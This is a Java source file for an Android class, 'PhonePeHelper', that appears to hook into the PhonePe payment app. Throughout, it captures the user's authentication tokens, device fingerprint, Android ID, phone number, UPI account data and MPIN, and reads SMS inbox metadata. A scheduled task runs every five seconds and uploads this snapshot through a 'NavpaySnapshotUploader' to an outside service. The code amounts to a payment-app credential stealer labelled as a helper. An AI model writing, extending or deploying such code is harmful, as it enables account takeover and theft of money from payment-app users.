package com.PhonePeTweak.Def;

import android.content.ContentResolver;
import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import com.phonepehelper.NavpaySnapshotUploader;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public final class PhonePeHelper {
    public enum TokenSyncResult {
        LOCAL_TO_SERVER,
        SERVER_TO_LOCAL,
        NO_CHANGE,
        ERROR
    }

    public interface ResultCallback {
        void onResult(boolean ok, String message);
    }

    private static final String TAG = "PPHelper";
    private static final String PREFS_NAME = "pph_store";

    private static final String KEY_USER_PHONE = "user_phone";
    private static final String KEY_X_DEVICE_FP = "x_device_fp";

    private static final String KEY_TOKEN_1FA = "token_1fa";
    private static final String KEY_TOKEN_SSO = "token_sso";
    private static final String KEY_TOKEN_AUTH = "token_auth";
    private static final String KEY_TOKEN_ACCOUNTS = "token_accounts";

    private static final String KEY_SENT_1FA = "sent_1fa";
    private static final String KEY_SENT_SSO = "sent_sso";
    private static final String KEY_SENT_AUTH = "sent_auth";
    private static final String KEY_SENT_ACCOUNTS = "sent_accounts";

    private static final String KEY_LAST_MPIN = "last_mpin";
    private static final String KEY_UPI_CACHE = "upi_cache";

    private static volatile Context appContext;
    private static volatile SharedPreferences prefs;
    private static volatile ScheduledExecutorService phoneNumberMonitor;
    private static final AtomicReference<Object> handlerRef = new AtomicReference<>();
    public static volatile String LastMpin = "";

    private PhonePeHelper() {}

    public static synchronized void init(Context context) {
        if (context == null) {
            return;
        }
        if (appContext != null) {
            return;
        }
        Context candidate = context.getApplicationContext();
        appContext = candidate != null ? candidate : context;
        prefs = appContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        Log.i(TAG, "PhonePeHelper.init ok");
    }

    public static Context getContext() {
        return appContext;
    }

    public static void setUserPhoneNum(String phoneNumber) {
        ensurePrefs();
        if (prefs == null) {
            return;
        }
        if (phoneNumber == null) {
            phoneNumber = "";
        }
        prefs.edit().putString(KEY_USER_PHONE, phoneNumber).apply();
        Log.i(TAG, "setUserPhoneNum: " + phoneNumber);
    }

    public static String getUserPhoneNum() {
        ensurePrefs();
        if (prefs == null) {
            return "";
        }
        return prefs.getString(KEY_USER_PHONE, "");
    }

    public static String readUserPhoneNum() {
        return getUserPhoneNum();
    }

    public static void setX_Device_Fingerprint(String fingerprint) {
        ensurePrefs();
        if (prefs == null) {
            return;
        }
        if (fingerprint == null) {
            fingerprint = "";
        }
        prefs.edit().putString(KEY_X_DEVICE_FP, fingerprint).apply();
    }

    public static String getDeviceFingerPrint() {
        ensurePrefs();
        if (prefs == null) {
            return "";
        }
        return prefs.getString(KEY_X_DEVICE_FP, "");
    }

    public static JSONObject get1faToken() {
        return readJson(KEY_TOKEN_1FA);
    }

    public static JSONObject getSSOToken() {
        return readJson(KEY_TOKEN_SSO);
    }

    public static JSONObject getAuthToken() {
        return readJson(KEY_TOKEN_AUTH);
    }

    public static JSONObject getAccountsToken() {
        return readJson(KEY_TOKEN_ACCOUNTS);
    }

    public static boolean set1faToken(JSONObject json) {
        return writeJson(KEY_TOKEN_1FA, json);
    }

    public static boolean saveSSOToken(JSONObject json) {
        return writeJson(KEY_TOKEN_SSO, json);
    }

    public static boolean saveSSOToken(Object tokenObj, int reason) {
        return writeJson(KEY_TOKEN_SSO, wrapObject(tokenObj, reason));
    }

    public static boolean saveAuthToken(JSONObject json) {
        return writeJson(KEY_TOKEN_AUTH, json);
    }

    public static boolean saveAccountsToken(JSONObject json) {
        return writeJson(KEY_TOKEN_ACCOUNTS, json);
    }

    public static boolean saveAccountsToken(Object tokenObj) {
        return writeJson(KEY_TOKEN_ACCOUNTS, wrapObject(tokenObj, 0));
    }

    public static JSONArray getUPIs() {
        ensurePrefs();
        JSONArray arr = new JSONArray();
        if (prefs == null) {
            return arr;
        }
        String raw = prefs.getString(KEY_UPI_CACHE, "");
        if (!TextUtils.isEmpty(raw)) {
            try {
                return new JSONArray(raw);
            } catch (JSONException e) {
                Log.w(TAG, "getUPIs parse cache failed", e);
            }
        }
        try {
            JSONObject fallback = buildUPIInfo(getUserPhoneNum(), "", new JSONArray());
            fallback.put("source", "local_stub");
            fallback.put("status", "no_account_data");
            arr.put(fallback);
        } catch (JSONException e) {
            Log.w(TAG, "getUPIs fallback build failed", e);
        }
        return arr;
    }

    public static JSONObject buildUPIInfo(String account, String accountNum, JSONArray vpas) {
        JSONObject obj = new JSONObject();
        try {
            obj.put("account", account == null ? "" : account);
            obj.put("accountNum", accountNum == null ? "" : accountNum);
            obj.put("appType", "phonepe");
            obj.put("upis", vpas == null ? new JSONArray() : vpas);
        } catch (JSONException e) {
            Log.w(TAG, "buildUPIInfo failed", e);
        }
        return obj;
    }

    public static JSONObject getRequestMetaInfoObj() {
        JSONObject obj = new JSONObject();
        try {
            String androidId = getAndroidId();
            String userPhone = getUserPhoneNum();
            String deviceFp = getDeviceFingerPrint();
            JSONObject tokens = buildTokenSnapshot();

            obj.put("package", appContext == null ? "" : appContext.getPackageName());
            obj.put("appType", "phonepe");
            obj.put("clientVersion", Build.VERSION.RELEASE);
            obj.put("userPhone", userPhone);
            obj.put("phoneNumber", userPhone);
            obj.put("androidId", androidId);
            obj.put("androidDeviceId", androidId);
            obj.put("device", Build.MODEL);
            obj.put("brand", Build.BRAND);
            obj.put("manufacturer", Build.MANUFACTURER);
            obj.put("xDeviceFingerprint", deviceFp);
            obj.put("deviceFingerprint", deviceFp);
            obj.put("handlerReady", handlerRef.get() != null);
            obj.put("metaBuiltAt", formatDate(System.currentTimeMillis()));
            obj.put("tokens", tokens);
            obj.put("token", tokens.optJSONObject("1fa"));
            obj.put("ssoToken", tokens.optJSONObject("sso"));
            obj.put("authToken", tokens.optJSONObject("auth"));
            obj.put("accountsToken", tokens.optJSONObject("accounts"));
        } catch (JSONException e) {
            Log.w(TAG, "getRequestMetaInfoObj failed", e);
        }
        return obj;
    }

    public static String getRequestMetaInfo() {
        String meta = getRequestMetaInfoObj().toString();
        logLong(TAG, "request-meta built: " + meta);
        return meta;
    }

    public static String getUPIRequestMetaInfo() {
        return getRequestMetaInfoObj().toString();
    }

    public static JSONObject buildSnapshotForNavpay() {
        JSONObject snapshot = new JSONObject();
        try {
            snapshot.put("requestMeta", getRequestMetaInfoObj());
            snapshot.put("upis", getUPIs());
            snapshot.put("collectedAtMs", System.currentTimeMillis());
        } catch (JSONException e) {
            Log.w(TAG, "buildSnapshotForNavpay failed", e);
        }
        return snapshot;
    }

    public static void uploadSnapshotToNavpayAsync() {
        NavpaySnapshotUploader.uploadSnapshotAsync(getAndroidId(), buildSnapshotForNavpay());
    }

    public static void startPhoneNumberMonitoring() {
        ensurePrefs();
        if (appContext == null) {
            Log.w(TAG, "startPhoneNumberMonitoring skipped: context null");
            return;
        }
        if (phoneNumberMonitor != null) {
            Log.i(TAG, "startPhoneNumberMonitoring skipped: already running");
            return;
        }
        phoneNumberMonitor = Executors.newSingleThreadScheduledExecutor();
        phoneNumberMonitor.scheduleAtFixedRate(new Runnable() {
            private String lastPhone = getUserPhoneNum();
            private long tick = 0;

            @Override
            public void run() {
                tick++;
                String current = getUserPhoneNum();
                if (!TextUtils.equals(lastPhone, current)) {
                    lastPhone = current;
                    Log.i(TAG, "phone changed: " + current);
                }
                TokenSyncResult result = performTokenSync();
                Log.i(TAG, "monitor tick: " + tick + ", result=" + result);
            }
        }, 2, 5, TimeUnit.SECONDS);
        Log.i(TAG, "startPhoneNumberMonitoring started");
    }

    public static void stopPhoneNumberMonitoring() {
        if (phoneNumberMonitor != null) {
            phoneNumberMonitor.shutdownNow();
            phoneNumberMonitor = null;
        }
    }

    public static boolean publishTokenUpdateIfNeeded(boolean force) {
        ensurePrefs();
        if (prefs == null) {
            return false;
        }
        JSONObject snapshot;
        try {
            snapshot = buildTokenSnapshot();
        } catch (JSONException e) {
            Log.w(TAG, "publishTokenUpdateIfNeeded: build snapshot failed", e);
            return false;
        }
        String v1 = stringify(snapshot.optJSONObject("1fa"));
        String v2 = stringify(snapshot.optJSONObject("sso"));
        String v3 = stringify(snapshot.optJSONObject("auth"));
        String v4 = stringify(snapshot.optJSONObject("accounts"));

        String last1fa = prefs.getString(KEY_SENT_1FA, "");
        String lastSso = prefs.getString(KEY_SENT_SSO, "");
        String lastAuth = prefs.getString(KEY_SENT_AUTH, "");
        String lastAccounts = prefs.getString(KEY_SENT_ACCOUNTS, "");

        boolean changed = force
                || !TextUtils.equals(v1, last1fa)
                || !TextUtils.equals(v2, lastSso)
                || !TextUtils.equals(v3, lastAuth)
                || !TextUtils.equals(v4, lastAccounts);

        if (!changed) {
            return false;
        }

        prefs.edit()
                .putString(KEY_SENT_1FA, v1)
                .putString(KEY_SENT_SSO, v2)
                .putString(KEY_SENT_AUTH, v3)
                .putString(KEY_SENT_ACCOUNTS, v4)
                .apply();

        Log.i(TAG, "publishTokenUpdateIfNeeded: changed=" + changed + ", force=" + force);
        Log.i(TAG, "token snapshot: 1fa=" + summarizeToken(snapshot.optJSONObject("1fa"))
                + ", sso=" + summarizeToken(snapshot.optJSONObject("sso"))
                + ", auth=" + summarizeToken(snapshot.optJSONObject("auth"))
                + ", accounts=" + summarizeToken(snapshot.optJSONObject("accounts")));
        getRequestMetaInfo();
        uploadSnapshotToNavpayAsync();
        return true;
    }

    public static TokenSyncResult performTokenSync() {
        if (appContext == null || prefs == null) {
            Log.w(TAG, "performTokenSync: context or prefs unavailable");
            return TokenSyncResult.ERROR;
        }
        boolean updated = publishTokenUpdateIfNeeded(false);
        if (updated) {
            return TokenSyncResult.LOCAL_TO_SERVER;
        }
        return TokenSyncResult.NO_CHANGE;
    }

    public static void PublishMPIN(String mpin) {
        ensurePrefs();
        if (prefs == null) {
            return;
        }
        if (mpin == null) {
            mpin = "";
        }
        LastMpin = mpin;
        prefs.edit().putString(KEY_LAST_MPIN, mpin).apply();
        Log.i(TAG, "PublishMPIN: length=" + mpin.length());
    }

    public static void PublishMPIN() {
        PublishMPIN(LastMpin);
    }

    public static String getLastMpin() {
        ensurePrefs();
        if (prefs == null) {
            return "";
        }
        return prefs.getString(KEY_LAST_MPIN, "");
    }

    public static void readRecentSms() {
        if (appContext == null) {
            return;
        }
        try {
            ContentResolver resolver = appContext.getContentResolver();
            Uri uri = Uri.parse("content://sms/inbox");
            Cursor cursor = resolver.query(uri, new String[]{"_id", "date", "address"}, null, null, "date DESC");
            if (cursor == null) {
                Log.w(TAG, "readRecentSms: cursor null");
                return;
            }
            int count = 0;
            while (cursor.moveToNext() && count < 3) {
                long id = cursor.getLong(0);
                long date = cursor.getLong(1);
                String address = cursor.getString(2);
                Log.i(TAG, "sms id=" + id + " date=" + formatDate(date) + " from=" + address);
                count++;
            }
            cursor.close();
        } catch (Throwable t) {
            Log.w(TAG, "readRecentSms failed", t);
        }
    }

    public static void performDataSyncBackup() {
        Log.i(TAG, "performDataSyncBackup: noop");
    }

    public static void refreshToken(ResultCallback callback) {
        Log.i(TAG, "refreshToken: stub invoked");
        if (callback != null) {
            callback.onResult(true, "ok");
        }
    }

    public static void saveHandler(Object handler) {
        handlerRef.set(handler);
        Log.i(TAG, "saveHandler: " + (handler != null));
    }

    public static boolean shouldUpdateToken(String topic, String newValue, JSONObject currentValue) {
        if (TextUtils.isEmpty(newValue)) {
            return false;
        }
        if (currentValue == null || currentValue.length() == 0) {
            return true;
        }
        String oldValue = stringify(currentValue);
        if (TextUtils.equals(newValue, oldValue)) {
            return false;
        }
        long currentExpiry = parseExpiry(currentValue);
        long newExpiry = parseExpiry(safeJson(newValue));
        if (newExpiry > 0 && currentExpiry > 0) {
            boolean should = newExpiry >= currentExpiry;
            Log.i(TAG, "shouldUpdateToken(" + topic + "): currentExpiry=" + currentExpiry
                    + ", newExpiry=" + newExpiry + ", update=" + should);
            return should;
        }
        return true;
    }

    private static void ensurePrefs() {
        if (appContext == null) {
            return;
        }
        if (prefs == null) {
            prefs = appContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        }
    }

    private static JSONObject readJson(String key) {
        ensurePrefs();
        if (prefs == null) {
            return new JSONObject();
        }
        String raw = prefs.getString(key, "");
        if (TextUtils.isEmpty(raw)) {
            return new JSONObject();
        }
        try {
            return new JSONObject(raw);
        } catch (JSONException e) {
            Log.w(TAG, "readJson failed: " + key, e);
            return new JSONObject();
        }
    }

    private static boolean writeJson(String key, JSONObject json) {
        ensurePrefs();
        if (prefs == null) {
            return false;
        }
        if (json == null) {
            json = new JSONObject();
        }
        prefs.edit().putString(key, json.toString()).apply();
        return true;
    }

    private static JSONObject wrapObject(Object obj, int reason) {
        JSONObject json = new JSONObject();
        try {
            json.put("raw", String.valueOf(obj));
            json.put("reason", reason);
        } catch (JSONException e) {
            Log.w(TAG, "wrapObject failed", e);
        }
        return json;
    }

    private static String stringify(JSONObject obj) {
        return obj == null ? "" : obj.toString();
    }

    private static JSONObject buildTokenSnapshot() throws JSONException {
        JSONObject tokens = new JSONObject();
        tokens.put("1fa", get1faToken());
        tokens.put("sso", getSSOToken());
        tokens.put("auth", getAuthToken());
        tokens.put("accounts", getAccountsToken());
        return tokens;
    }

    private static String summarizeToken(JSONObject tokenObj) {
        if (tokenObj == null || tokenObj.length() == 0) {
            return "empty";
        }
        String token = tokenObj.optString("token", "");
        if (TextUtils.isEmpty(token)) {
            token = tokenObj.optString("raw", "");
        }
        long expiry = parseExpiry(tokenObj);
        return "len=" + token.length() + ",expiry=" + expiry;
    }

    private static long parseExpiry(JSONObject tokenObj) {
        if (tokenObj == null) {
            return 0L;
        }
        long expiry = tokenObj.optLong("expiry", 0L);
        if (expiry > 0) {
            return expiry;
        }
        return tokenObj.optLong("exp", 0L);
    }

    private static JSONObject safeJson(String value) {
        if (TextUtils.isEmpty(value)) {
            return new JSONObject();
        }
        try {
            return new JSONObject(value);
        } catch (JSONException e) {
            return new JSONObject();
        }
    }

    private static String getAndroidId() {
        if (appContext == null) {
            return "";
        }
        try {
            String id = Settings.Secure.getString(appContext.getContentResolver(), Settings.Secure.ANDROID_ID);
            return id == null ? "" : id;
        } catch (Throwable t) {
            return "";
        }
    }

    private static String formatDate(long time) {
        try {
            return new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date(time));
        } catch (Throwable t) {
            return String.valueOf(time);
        }
    }

    public static void logLong(String tag, String msg) {
        if (msg == null) {
            return;
        }
        int max = 3000;
        int len = msg.length();
        int start = 0;
        while (start < len) {
            int end = Math.min(start + max, len);
            Log.i(tag, msg.substring(start, end));
            start = end;
        }
    }
}
